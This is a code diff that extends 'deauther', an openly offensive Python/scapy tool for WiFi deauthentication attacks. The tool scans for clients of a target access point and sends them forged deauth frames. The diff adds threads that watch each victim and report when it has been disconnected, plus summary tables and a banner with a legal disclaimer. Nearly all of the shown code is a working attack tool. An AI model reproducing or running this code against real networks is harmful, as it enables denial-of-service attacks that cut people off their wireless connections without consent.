@@ -2,7 +2,7 @@
 #
 #--------------------------------------------------------------------------------------------------------------------------
 # Author: Rofi (Fixploit03)
-# GitHub: https://github.com/fixploit03/deathpy
+# GitHub: https://github.com/fixploit03/deauther
 # Copyright (c) 2025 - Rofi (Fixploit03)
 #--------------------------------------------------------------------------------------------------------------------------
 # DISCLAIMER:
@@ -34,13 +34,52 @@ import os                      # Operating system interactions
 import signal                  # Signal handling (e.g., CTRL+C)
 import argparse                # Command-line argument parsing
 import platform                # Detailed operating system information
+import threading               # Threading for parallel monitoring
 from scapy.all import *        # Network packet manipulation and sending
 from termcolor import colored  # Colored terminal output
+from prettytable import PrettyTable  # For displaying summary in table format
+from pyfiglet import Figlet    # For creating ASCII art banner
 
 # --- Global Variables ---
 stop_attack = False  # Flag to stop the attack when CTRL+C is pressed
 
 # --- Function Definitions ---
+
+def display_intro():
+    """
+    Display the program banner and information with a 5-second pause after the legal disclaimer.
+    """
+    # Display banner
+    fig = Figlet(font='standard')  # Using 'standard' font to avoid slant
+    banner = fig.renderText("Deauth Attack")
+    print(colored(banner, 'red', attrs=['bold']))
+    
+    # Program information below banner
+    program_info = (
+        "WiFi Deauthentication Attack Program\n"
+        "Author: Rofi (Fixploit03)\n"
+        "GitHub: https://github.com/fixploit03/deauther\n"
+        "Copyright (c) 2025 Rofi (Fixploit03). All rights reserved."
+    )
+    print(colored(program_info, 'white'))
+    
+    # Add one line space before legal disclaimer
+    print()
+    
+    # Legal disclaimer with separate coloring
+    legal_label = "[!] Legal Disclaimer:"
+    legal_text = (
+        " Usage of this program for attacking targets without prior mutual consent is illegal. "
+        "It is the end user's responsibility to obey all applicable local, state, and federal laws. "
+        "The author assumes no liability and is not responsible for any misuse or damage caused by this program."
+    )
+    print(colored(legal_label, 'yellow') + colored(legal_text, 'white'))
+    
+    # Pause for 5 seconds to allow the user to read the disclaimer
+    time.sleep(5)
+    
+    # Add one line space after legal disclaimer
+    print()
 
 def signal_handler(sig, frame):
     """
@@ -57,6 +96,8 @@ def signal_handler(sig, frame):
     time_str = colored(get_current_time(), 'cyan')
     print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored("CTRL+C detected. Stopping deauthentication attack...", 'white'))
     stop_attack = True
+    print()  # Add one line space before ending message
+    print(colored(f"[*] Ending @ {time.strftime('%H:%M:%S /%Y-%m-%d/')}", 'white'))
     sys.exit(0)
 
 def get_current_time():
@@ -140,7 +181,7 @@ def create_deauth_packet(bssid, client, reason=1):
 
     Args:
         bssid (str): MAC address of the target Access Point (AP).
-        client (str): MAC address of the target client or "ff:ff:ff:ff:ff:ff" for broadcast.
+        client (str): MAC address of the target client.
         reason (int, optional): Deauthentication reason code (default is 1).
 
     Returns:
@@ -186,9 +227,33 @@ def scan_clients(interface, bssid, channel, timeout=30, verbose=False):
     sniff(iface=interface, prn=packet_handler, timeout=timeout)
     return list(clients)
 
+def monitor_client_status(interface, bssid, client_mac, timeout=5):
+    """
+    Monitor client activity to determine if they are still connected.
+
+    Args:
+        interface (str): Network interface in monitor mode.
+        bssid (str): MAC address of the AP.
+        client_mac (str): MAC address of the client to monitor.
+        timeout (int): Duration to monitor in seconds before assuming disconnection.
+
+    Returns:
+        bool: True if client is detected as active, False if assumed disconnected.
+    """
+    client_active = False
+
+    def packet_handler(pkt):
+        nonlocal client_active
+        if pkt.haslayer(Dot11) and pkt.addr2 == client_mac and pkt.addr1 == bssid:
+            client_active = True
+
+    sniff(iface=interface, prn=packet_handler, timeout=timeout)
+    return client_active
+
 def send_deauth_packets(interface, bssid, clients, count, channel, interval=0, reason=1, is_manual_client=False, verbose=False):
     """
-    Send deauthentication packets to specified clients or broadcast with a specified reason code.
+    Send deauthentication packets to specified clients with a specified reason code,
+    continuously monitor client disconnection status, and report summary in table format at the end.
 
     Args:
         interface (str): Network interface in monitor mode.
@@ -205,21 +270,46 @@ def send_deauth_packets(interface, bssid, clients, count, channel, interval=0, r
         None: Exits with status code 1 on error.
     """
     try:
-        if not clients:
-            time_str = colored(get_current_time(), 'cyan')
-            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored("No clients found, switching to broadcast mode.", 'white'))
-            clients = ["ff:ff:ff:ff:ff:ff"]
-        elif is_manual_client:
+        if is_manual_client:
             time_str = colored(get_current_time(), 'cyan')
             print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Targeting specified client: {clients}", 'white'))
         else:
             time_str = colored(get_current_time(), 'cyan')
-            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Found {len(clients)} clients: {clients}", 'white'))
+            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("SUMMARY", 'cyan', attrs=['bold']) + colored("] ", 'white') + colored("Detected Clients:", 'white'))
+            table = PrettyTable()
+            table.field_names = ["No", "Client MAC Address"]
+            for idx, client in enumerate(clients, start=1):
+                table.add_row([idx, client])
+            print(table)
 
         bssid = validate_mac(bssid)
         os.system(f"iwconfig {interface} channel {channel}")
 
         packet_sent_logged = False
+        disconnected_clients = set()  # Track clients that were disconnected at least once
+
+        def monitor_client_continuously(client_mac):
+            """Continuously monitor client status and report if disconnected."""
+            first_disconnect_reported = False
+            while not stop_attack:
+                if not monitor_client_status(interface, bssid, client_mac, timeout=5):
+                    disconnected_clients.add(client_mac)
+                    time_str = colored(get_current_time(), 'cyan')
+                    if not first_disconnect_reported:
+                        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("SUCCESS", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Client {client_mac} has been disconnected!", 'white'))
+                        first_disconnect_reported = True
+                    elif verbose:
+                        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("SUCCESS", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Client {client_mac} is still disconnected!", 'white'))
+                else:
+                    if first_disconnect_reported:
+                        time_str = colored(get_current_time(), 'cyan')
+                        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Client {client_mac} has reconnected.", 'white'))
+                        first_disconnect_reported = False
+                time.sleep(5)  # Check every 5 seconds
+
+        # Start monitoring threads for each client
+        for client_mac in clients:
+            threading.Thread(target=monitor_client_continuously, args=(client_mac,), daemon=True).start()
 
         if count == 0:
             time_str = colored(get_current_time(), 'cyan')
@@ -231,10 +321,7 @@ def send_deauth_packets(interface, bssid, clients, count, channel, interval=0, r
                     sendp(packet, iface=interface, verbose=0)
                     time_str = colored(get_current_time(), 'cyan')
                     if verbose:
-                        if client_mac != "ff:ff:ff:ff:ff:ff":
-                            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet {packet_number} to {bssid} (CLIENT: {client_mac})", 'white'))
-                        else:
-                            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet {packet_number} to {bssid} (broadcast mode)", 'white'))
+                        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet {packet_number} to {bssid} (CLIENT: {client_mac})", 'white'))
                     elif not packet_sent_logged:
                         print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet to {bssid}", 'white'))
                         packet_sent_logged = True
@@ -255,18 +342,29 @@ def send_deauth_packets(interface, bssid, clients, count, channel, interval=0, r
                     sendp(packet, iface=interface, verbose=0)
                     time_str = colored(get_current_time(), 'cyan')
                     if verbose:
-                        if client_mac != "ff:ff:ff:ff:ff:ff":
-                            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet {packet_number}/{total_packets} to {bssid} (CLIENT: {client_mac})", 'white'))
-                        else:
-                            print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet {packet_number}/{total_packets} to {bssid} (broadcast mode)", 'white'))
+                        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet {packet_number}/{total_packets} to {bssid} (CLIENT: {client_mac})", 'white'))
                     elif not packet_sent_logged:
                         print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored(f"Sending packet to {bssid}", 'white'))
                         packet_sent_logged = True
                     packet_number += 1
                     time.sleep(interval)
 
+        # Attack completed message
         time_str = colored(get_current_time(), 'cyan')
         print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored("Deauthentication attack completed.", 'white'))
+
+        # Summary of disconnected clients in table format
+        time_str = colored(get_current_time(), 'cyan')
+        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("SUMMARY", 'cyan', attrs=['bold']) + colored("] ", 'white') + colored("Disconnected Clients:", 'white'))
+        
+        table = PrettyTable()
+        table.field_names = ["No", "Client MAC Address"]
+        if disconnected_clients:
+            for idx, client in enumerate(disconnected_clients, start=1):
+                table.add_row([idx, client])
+        else:
+            table.add_row(["-", "No clients were successfully disconnected"])
+        print(table)
 
     except PermissionError:
         time_str = colored(get_current_time(), 'cyan')
@@ -287,30 +385,11 @@ def main():
     Returns:
         None: Exits with status code 1 on error.
     """
-    # Check if the operating system is Linux
-    os_name = platform.system()
-    if os_name != "Linux":
-        time_str = colored(get_current_time(), 'cyan')
-        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored(f"This program is only supported on Linux! Detected OS: {os_name}", 'white'))
-        sys.exit(1)
+    # Display banner and program info at the start
+    display_intro()
 
-    # Set up signal handler for CTRL+C
-    signal.signal(signal.SIGINT, signal_handler)
-    
-    # Ensure root privileges
-    check_root()
-
-    # Program description for help menu
-    description = (
-        "WiFi Deauthentication Attack Program\n"
-        "Author: Rofi (Fixploit03)\n"
-        "GitHub: https://github.com/fixploit03/deauther\n"
-        "Copyright (c) 2025 Rofi (Fixploit03). All rights reserved."
-    )
-
-    # Set up argument parser
+    # Set up argument parser without detailed description
     parser = argparse.ArgumentParser(
-        description=description,
         formatter_class=argparse.RawTextHelpFormatter
     )
     
@@ -345,6 +424,23 @@ def main():
     # Parse command-line arguments
     args = parser.parse_args()
 
+    # Print starting message only after parsing args (won't show in --help)
+    print(colored(f"[*] Starting @ {time.strftime('%H:%M:%S /%Y-%m-%d/')}", 'white'))
+    print()
+
+    # Check if the operating system is Linux
+    os_name = platform.system()
+    if os_name != "Linux":
+        time_str = colored(get_current_time(), 'cyan')
+        print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored(f"This program is only supported on Linux! Detected OS: {os_name}", 'white'))
+        sys.exit(1)
+
+    # Set up signal handler for CTRL+C
+    signal.signal(signal.SIGINT, signal_handler)
+    
+    # Ensure root privileges
+    check_root()
+
     # Validate network interface
     check_interface_exists(args.interface)
     check_interface_mode(args.interface)
@@ -353,11 +449,22 @@ def main():
         # If no client is specified, scan for connected clients
         if args.client is None:
             clients = scan_clients(args.interface, args.bssid, args.channel, args.timeout, verbose=args.verbose)
+            if not clients:
+                time_str = colored(get_current_time(), 'cyan')
+                print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("ERROR", 'red', attrs=['bold']) + colored("] ", 'white') + colored("No clients detected!", 'white'))
+                print(colored(f"[{time_str}] ", 'white') + colored("[", 'white') + colored("INFO", 'green', attrs=['bold']) + colored("] ", 'white') + colored("Exiting program.", 'white'))
+                print()
+                print(colored(f"[*] Ending @ {time.strftime('%H:%M:%S /%Y-%m-%d/')}", 'white'))
+                sys.exit(1)
             send_deauth_packets(args.interface, args.bssid, clients, args.count, args.channel, args.interval, args.reason, is_manual_client=False, verbose=args.verbose)
         # If a client is specified, use it directly
         else:
             clients = [validate_mac(args.client)]
             send_deauth_packets(args.interface, args.bssid, clients, args.count, args.channel, args.interval, args.reason, is_manual_client=True, verbose=args.verbose)
+        
+        # Print ending message with one line space above if program completes normally
+        print()
+        print(colored(f"[*] Ending @ {time.strftime('%H:%M:%S /%Y-%m-%d/')}", 'white'))
 
     except ValueError as ve:
         time_str = colored(get_current_time(), 'cyan')
